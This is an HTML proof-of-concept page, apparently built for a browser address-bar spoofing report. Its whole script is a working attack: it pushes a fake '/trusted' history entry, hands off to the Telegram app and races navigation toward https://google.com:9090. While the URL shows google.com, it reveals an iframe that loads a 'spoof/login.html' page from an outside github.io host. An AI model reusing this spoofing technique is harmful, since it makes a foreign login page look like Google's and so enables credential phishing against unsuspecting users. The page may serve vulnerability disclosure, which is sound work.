<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Strong PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 16px;
  padding: 12px 18px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  max-width: 420px;
  margin: 100px auto;
  background: #fff;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

#iframeWrap {
  display: none;
  margin-top: 20px;
}

#iframeWrap iframe {
  width: 100%;
  height: 180px;
  border: 1px solid #ddd;
  border-radius: 8px;
}

#spoof {
  display: none;
  margin-top: 20px;
  font-size: 28px;
  font-weight: 700;
  color: #b00020;
}
</style>
</head>

<body>

<div id="panel">
  <button onclick="start()">Start</button>

  <div id="iframeWrap">
    <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
  </div>

  <div id="spoof">NOT GOOGLE</div>
</div>

<script>
const spoof = document.getElementById('spoof');
const iframeWrap = document.getElementById('iframeWrap');

function showSpoofOnce() {
  if (spoof.style.display !== 'block') {
    spoof.style.display = 'block';
  }
}

/* Mulai PoC */
function start() {
  history.pushState({}, '', '/trusted');

  /* iframe muncul 2 detik setelah klik */
  setTimeout(() => {
    iframeWrap.style.display = 'block';
  }, 2000);

  /* App handoff */
  setTimeout(() => {
    location.href = 'tg://resolve?domain=telegram';
  }, 200);

  /* Guard fallback */
  setTimeout(showSpoofOnce, 3000);
}

/* Navigation race */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

/* KUAT: trigger berdasarkan URL */
(function watchURL() {
  const MAX_MS = 120000;
  const t0 = Date.now();

  const iv = setInterval(() => {
    try {
      if (location.href.startsWith('https://google.com')) {
        showSpoofOnce();
        clearInterval(iv);
      }
      if (Date.now() - t0 > MAX_MS) {
        clearInterval(iv);
      }
    } catch (e) {}
  }, 50);
})();

/* Stabil saat balik dari app */
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible' &&
      location.href.startsWith('https://google.com')) {
    showSpoofOnce();
  }
});
</script>

</body>
</html>
